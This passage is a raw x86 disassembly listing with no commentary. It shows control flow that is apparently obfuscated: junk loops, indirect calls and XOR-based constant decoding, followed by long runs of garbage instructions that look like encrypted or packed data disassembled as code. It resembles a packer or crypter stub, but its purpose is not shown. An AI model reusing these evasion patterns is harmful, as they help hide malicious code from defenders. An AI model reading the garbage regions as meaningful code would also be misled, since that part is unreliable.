  4037ce:	or     cl,dh
  4037d0:	jmp    0x4037ff
  4037d2:	jno    0x40378e
  4037d4:	push   es
  4037d5:	cmp    eax,DWORD PTR [eax]
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x51cfcd93],0xffffffec
  403d2b:	or     eax,0x7e7e11b6
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cfa
  403d35:	or     BYTE PTR [ecx],0x36
  403d38:	aas    
  403d39:	mov    eax,0x5fff8a8d
  403d3e:	mov    ebp,0x1262b2b0
  403d43:	fistp  WORD PTR [edi-0x77de5105]
  403d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d4a:	scas   al,BYTE PTR es:[edi]
  403d4b:	add    al,0xae
  403d4d:	cmp    dh,dl
  403d4f:	adc    BYTE PTR [ecx+edi*2],ch
  403d52:	setp   BYTE PTR [ecx-0x5f4875cb]
  403d59:	out    0x9,al
  403d5b:	shl    DWORD PTR [eax+0x58c74770],cl
  403d61:	dec    edx
  403d62:	or     ebp,ebx
  403d64:	repnz pusha 
  403d66:	shr    DWORD PTR [edx-0x70e654ff],0xf0
  403d6d:	(bad)  
  403d6e:	idiv   DWORD PTR [edx+0x50]
  403d71:	lds    edi,FWORD PTR [ecx-0x7c5eccd2]
  403d77:	mov    ah,BYTE PTR [edi]
  403d79:	daa    
  403d7a:	cwde   
  403d7b:	enter  0x3eda,0xae
  403d7f:	popf   
  403d80:	cmc    
  403d81:	into   
  403d82:	cwde   
  403d83:	(bad)  
  403d84:	scas   eax,DWORD PTR es:[edi]
  403d85:	or     DWORD PTR [ecx],edi
  403d87:	or     ecx,ebx
  403d89:	shr    DWORD PTR ds:0x70b88aa2,cl
  403d8f:	inc    esi
  403d90:	mov    WORD PTR [esi-0x6359920b],cs
  403d96:	jmp    0x403e0d
  403d98:	mov    al,0x9e
  403d9a:	pop    edi
  403d9b:	dec    esp
  403d9c:	xor    DWORD PTR [esi-0x611db7bc],edi
  403da2:	dec    ebp
  403da3:	arpl   WORD PTR [edx-0x16],bx
  403da6:	lods   al,BYTE PTR ds:[esi]
  403da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da9:	aaa    
  403daa:	pop    ss
  403dab:	int3   
  403dac:	push   ss
  403dad:	out    0x4b,eax
  403daf:	nop
  403db0:	rcr    BYTE PTR [ebx],1
  403db2:	les    ebx,FWORD PTR [edi+0x6544b445]
  403db8:	inc    edx
  403db9:	mov    ebx,0x8ad97e7d
  403dbe:	aas    
  403dbf:	scas   eax,DWORD PTR es:[edi]
  403dc0:	jmp    0x8d0eb07f
  403dc5:	popf   
  403dc6:	(bad)  
  403dc7:	mov    ds:0x203b30fc,al
  403dcc:	dec    ebp
  403dcd:	xchg   ebp,eax
  403dce:	mov    dh,0x1b
  403dd0:	jp     0x403d85
  403dd2:	adc    al,dl
  403dd4:	outs   dx,DWORD PTR ds:[esi]
  403dd5:	add    dl,BYTE PTR [ebx-0x4b68607f]
  403ddb:	lods   eax,DWORD PTR ds:[esi]
  403ddc:	mov    ecx,DWORD PTR [eax]
  403dde:	call   0xce5902c1
  403de3:	repnz mov al,0x70
  403de6:	(bad)  
  403de7:	out    0xc8,al
  403de9:	and    DWORD PTR [eax-0x4550d85f],ebp
  403def:	popf   
  403df0:	enter  0xe234,0x99
  403df4:	(bad)  
  403df5:	pop    eax
  403df6:	dec    eax
  403df7:	xchg   ebp,eax
  403df8:	jo     0x403df6
  403dfa:	rcl    DWORD PTR [eax],1
  403dfc:	out    dx,eax
  403dfd:	stos   DWORD PTR es:[edi],eax
  403dfe:	sbb    cl,ch
  403e00:	dec    eax
  403e01:	pushf  
  403e02:	fidiv  WORD PTR [edi-0x22]
  403e05:	xor    DWORD PTR [ebp+0x1246142c],edi
  403e0b:	mov    dl,0xeb
  403e0d:	mov    ds:0x4f97742e,eax
  403e12:	ficom  DWORD PTR [edi-0x4e]
  403e15:	push   esp
  403e16:	jmp    0xcc37:0x9385
  403e1c:	cld    
  403e1d:	push   ecx
  403e1e:	das    
  403e1f:	jns    0x403e72
  403e21:	nop
  403e22:	pop    esi
  403e23:	push   ds
  403e24:	dec    ebp
  403e25:	pusha  
  403e26:	jge    0x403e4b
  403e28:	js     0x403e00
  403e2a:	in     al,0xbc
  403e2c:	xchg   esi,eax
  403e2d:	ds pop ebp
  403e2f:	inc    ecx
  403e30:	lea    esi,[ecx-0x59]
  403e33:	test   eax,0x56b41371
  403e38:	dec    eax
  403e39:	inc    esp
  403e3a:	jp     0x403e07
  403e3c:	ins    DWORD PTR es:[edi],dx
  403e3d:	adc    ebx,DWORD PTR [ebx+ebx*2+0x22f8d72c]
  403e44:	mov    edx,0xaa9a522d
  403e49:	push   ds
  403e4a:	mov    al,ds:0xcf476beb
  403e4f:	cwde   
  403e50:	pop    esi
  403e51:	shr    DWORD PTR ds:0x611aefa7,cl
  403e57:	test   BYTE PTR [edi+ebx*4-0x5d],dl
  403e5b:	loope  0x403e0a
  403e5d:	psraw  mm2,mm3
  403e60:	data16 (bad) 
  403e63:	sub    DWORD PTR [ebx+0x23],0x198733
  403e6a:	cmp    al,0x49
  403e6c:	(bad)  [edx+0x73]
  403e6f:	jle    0x403e51
  403e71:	into   
  403e72:	int3   
  403e73:	sbb    al,0x21
  403e75:	adc    BYTE PTR [eax-0x5c],dh
  403e78:	in     al,0xa6
  403e7a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  403e7c:	(bad)  
  403e7d:	mov    al,0x61
  403e7f:	outs   dx,DWORD PTR ds:[esi]
  403e80:	inc    eax
  403e81:	inc    ebp
  403e82:	test   al,0x90
  403e84:	pop    es
  403e85:	sbb    esp,ecx
  403e87:	and    eax,0xbb0a55bc
  403e8c:	and    BYTE PTR [ebx-0x60],bl
  403e8f:	pop    edx
  403e90:	lock cmp al,0xf0
  403e93:	dec    esp
  403e94:	jmp    0x403e91
  403e96:	add    ebp,DWORD PTR [esi]
  403e98:	adc    BYTE PTR [ebx-0x6609a0bd],bh
  403e9e:	and    al,0x88
  403ea1:	sbb    BYTE PTR [esi+0x7e],0xc6
  403ea5:	and    eax,0x4171b472
  403eaa:	mov    cs,WORD PTR [eax-0x15021904]
  403eb0:	sbb    DWORD PTR [esi+0x14],ebx
  403eb3:	dec    esp
  403eb4:	in     eax,dx
  403eb5:	jmp    0x403e8d
  403eb7:	fcomp  st(2)
  403eb9:	sar    BYTE PTR [eax-0x75c0d237],1
  403ebf:	jge    0x403e8f
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x1d7278c4,al
  403efc:	idiv   DWORD PTR [ebp+0x4c]
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403e9d
  403f08:	fadd   DWORD PTR [eax+0x691df324]
  403f0e:	fdivp  st(4),st
  403f10:	dec    edi
  403f11:	hlt    
  403f12:	lahf   
  403f13:	pop    eax
  403f14:	scas   eax,DWORD PTR es:[edi]
  403f15:	mov    bh,0xab
  403f17:	dec    ebp
  403f18:	cld    
  403f19:	bound  eax,QWORD PTR [eax]
  403f1b:	ss pop ss
  403f1d:	mov    bl,0xad
  403f1f:	fwait
  403f20:	ins    BYTE PTR es:[edi],dx
  403f21:	mov    ebx,0x4012ebcd
  403f26:	push   ebx
  403f27:	inc    ebx
  403f28:	mov    ds,WORD PTR [esi]
  403f2a:	stc    
  403f2b:	jge    0x403ead
  403f2d:	sti    
  403f2e:	test   DWORD PTR [ebx-0x57],0x3c1acac6
  403f35:	call   0x6e66:0xc6237749
  403f3c:	out    dx,al
  403f3d:	jns    0x403fa0
  403f3f:	jge    0x403ecf
  403f41:	and    DWORD PTR ds:0x89fa195b,0x193790ff
  403f4b:	add    BYTE PTR [ecx+0x1fa15c2d],0x7
  403f52:	mov    edx,ebx
  403f54:	mov    DWORD PTR [edx-0x1f],esi
  403f57:	enter  0x2d98,0x6d
  403f5b:	push   ebx
  403f5c:	call   0x984ac91c
  403f61:	jnp    0x403f83
  403f63:	push   edx
  403f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f65:	retf   0xbfec
  403f68:	sbb    cl,BYTE PTR [esi]
  403f6a:	and    al,0xb5
  403f6c:	outs   dx,DWORD PTR ds:[esi]
  403f6d:	sbb    BYTE PTR [eax],0xc5
  403f70:	call   FWORD PTR [ebp-0x7f97ff2d]
  403f76:	mov    BYTE PTR [ebp+eiz*8+0x42],al
  403f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7b:	mov    esi,0x65dc64b5
  403f80:	xor    al,0x4a
  403f82:	ins    BYTE PTR es:[edi],dx
  403f83:	adc    BYTE PTR [ebx-0x379e8abb],0x36
  403f8a:	cmp    ah,dl
  403f8c:	test   al,0x69
  403f8e:	sub    al,0x74
  403f90:	shr    DWORD PTR [edx-0x79],0xbd
  403f94:	inc    esp
  403f95:	mov    al,BYTE PTR [eax-0x744de2d7]
  403f9b:	jmp    0x403f28
  403f9d:	imul   esp,DWORD PTR [eax],0x5aaf71b9
  403fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa4:	jmp    0x403f49
  403fa6:	push   es
  403fa7:	call   ebx
  403fa9:	xchg   DWORD PTR [edx],ebx
  403fab:	push   0x13b8a877
  403fb0:	xchg   esi,eax
  403fb1:	sub    eax,0xcb7d8be0
  403fb6:	pop    edi
  403fb7:	push   eax
  403fb8:	fs gs xchg ebx,eax
  403fbb:	daa    
  403fbc:	outs   dx,DWORD PTR ds:[esi]
  403fbd:	inc    ecx
  403fbe:	jl     0x403fcf
  403fc0:	test   BYTE PTR [edi-0x79d9eb73],ch
  403fc6:	popa   
  403fc7:	pop    edx
  403fc8:	aad    0xd3
  403fca:	adc    bl,BYTE PTR [ebp+edi*1+0x76a502ae]
  403fd1:	cwde   
  403fd2:	mov    esp,esp
  403fd4:	mov    edi,0xf6bf26b8
  403fd9:	(bad)  
  403fda:	in     eax,0x9e
  403fdc:	xchg   esi,eax
  403fdd:	inc    esp
  403fde:	loope  0x403f81
  403fe0:	icebp  
  403fe1:	in     eax,0x0
  403fe3:	imul   edi,esi,0x5f8402d7
  403fe9:	(bad)
  403fec:	push   esp
  403fed:	(bad)  
  403fef:	daa    
  403ff0:	lock retf 0x4cc4
  403ff4:	daa    
  403ff5:	or     al,0x1f
  403ff7:	pop    ebx
  403ff8:	push   ebp
  403ff9:	popf   
  403ffa:	xchg   ebx,eax
  403ffb:	push   ecx
  403ffc:	outs   dx,DWORD PTR ds:[esi]
  403ffd:	add    al,0xa3
  403fff:	test   DWORD PTR [edi-0x5b],ebp
  404002:	sbb    esi,DWORD PTR [ebx+0x49]
  404005:	xchg   esi,eax
  404006:	jge    0x404059
  404008:	adc    BYTE PTR [ebp+0x28],bh
  40400b:	std    
  40400c:	add    eax,0xcf0d9104
  404011:	adc    eax,0x52b01ab4
  404016:	xor    esi,eax
  404018:	lods   eax,DWORD PTR ds:[esi]
  404019:	test   edx,eax
  40401b:	lds    ebp,FWORD PTR [ecx-0x67e173ed]
  404021:	and    ebp,DWORD PTR [ebp+0x75]
  404024:	lods   al,BYTE PTR ds:[esi]
  404025:	push   edx
  404026:	adc    DWORD PTR [ebx],ebp
  404028:	mov    ah,0xb1
  40402a:	mov    eax,ecx
  40402c:	in     al,0xed
  40402e:	les    ebx,FWORD PTR [edi-0x30]
  404031:	push   ds
  404032:	(bad)  
  404033:	repnz xchg edx,eax
  404035:	ja     0x404065
  404037:	aaa    
  404038:	(bad)  
  404039:	cmp    DWORD PTR [edi],ecx
  40403b:	popa   
  40403c:	mov    ds,esi
  40403e:	into   
  40403f:	aam    0x7f
  404041:	mov    BYTE PTR ds:0xfda25be8,al
  404047:	dec    ebp
  404048:	xchg   ebp,eax
  404049:	sti    
  40404a:	adc    al,BYTE PTR [eax+0x4c100181]
  404050:	mov    al,0x92
  404052:	sbb    dl,ch
  404054:	push   ds
  404055:	xlat   BYTE PTR ds:[ebx]
  404056:	in     al,0x68
  404058:	push   edi
  404059:	jae    0x404042
  40405b:	push   0x8c2f4424
  404060:	sar    BYTE PTR [edx+0x39],cl
  404063:	das    
  404064:	and    ebp,DWORD PTR [eax+0x5f]
  404067:	lods   al,BYTE PTR ds:[esi]
  404068:	fcomp  DWORD PTR [ebp+0x70]
  40406b:	pop    esi
  40406c:	xor    dh,dl
  40406e:	shl    al,1
  404070:	push   ebp
  404071:	add    DWORD PTR [ebx+0x3b1eff68],0xe43567bf
  40407b:	cmp    eax,0x42c342e0
  404080:	int3   
  404081:	mov    bh,dl
  404083:	pop    esi
  404084:	adc    eax,ecx
  404086:	or     al,BYTE PTR [edi+0x5fce58a0]
  40408c:	jnp    0x4040a1
  40408e:	inc    edi
  40408f:	sub    DWORD PTR [edx],esp
  404091:	inc    edx
  404092:	add    bh,BYTE PTR [edi-0x162baa75]
  404098:	ja     0x40409f
  40409a:	add    BYTE PTR [eax],al
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x295e79ab]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x404046
  4040c0:	aaa    
  4040c1:	xchg   edx,eax
  4040c2:	push   ds
  4040c3:	push   esi
  4040c4:	aaa    
  4040c5:	xchg   esi,eax
  4040c6:	xchg   esi,eax
  4040c7:	jo     0x404076
  4040c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040ca:	push   cs
  4040cb:	aad    0xd8
  4040cd:	in     eax,0x16
  4040cf:	dec    edx
  4040d0:	das    
  4040d1:	lods   al,BYTE PTR ds:[esi]
  4040d2:	add    al,0xc6
  4040d4:	aaa    
  4040d5:	jp     0x404094
  4040d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d8:	dec    ebp
  4040d9:	and    BYTE PTR [esi+0x2c],dh
  4040dc:	(bad)  
  4040de:	jbe    0x40414b
  4040e0:	xchg   ebp,eax
  4040e1:	in     al,dx
  4040e2:	cli    
  4040e3:	lds    edi,FWORD PTR [eax]
  4040e5:	fcom   QWORD PTR [ecx+0x69b6ec89]
  4040eb:	rol    BYTE PTR [ebp+0x7d],1
  4040ee:	xchg   ebp,eax
  4040ef:	out    0x7f,eax
  4040f1:	dec    ebx
  4040f2:	cmc    
  4040f3:	mov    dl,0xf7
  4040f5:	(bad)  [edi-0x67]
  4040f8:	bnd jge 0x4040a7
  4040fb:	jb     0x40413f
  4040fd:	icebp  
  4040fe:	cmp    al,0x50
  404100:	mov    dl,0x27
  404102:	fidiv  DWORD PTR [edx]
  404104:	test   al,0xd2
  404106:	popa   
  404107:	adc    DWORD PTR [edi-0x6a],ecx
  40410a:	or     ecx,DWORD PTR [edx-0x6a]
  40410d:	sub    al,0xfe
  40410f:	pop    eax
  404110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404111:	pop    ebx
  404112:	ins    DWORD PTR es:[edi],dx
  404113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404114:	ds jecxz 0x4040c5
  404117:	outs   dx,BYTE PTR ds:[esi]
  404118:	out    dx,al
  404119:	xor    ebp,eax
  40411b:	lahf   
  40411c:	sub    al,0xb5
  40411e:	retf   0x459
  404121:	xlat   BYTE PTR ds:[ebx]
  404122:	rol    al,1
  404124:	popa   
  404125:	in     al,0xc7
  404127:	pop    ecx
  404128:	or     BYTE PTR [ebp+0x75],0x61
  40412c:	lods   eax,DWORD PTR ds:[esi]
  40412d:	stos   BYTE PTR es:[edi],al
  40412e:	loope  0x404131
  404130:	rcl    DWORD PTR [ebx-0x59c91da7],cl
  404136:	or     ah,BYTE PTR [ebx+ebp*4+0x6d98ce31]
  40413d:	mov    eax,ds:0x7b6df5f
  404142:	ja     0x4041b6
  404144:	jecxz  0x40419a
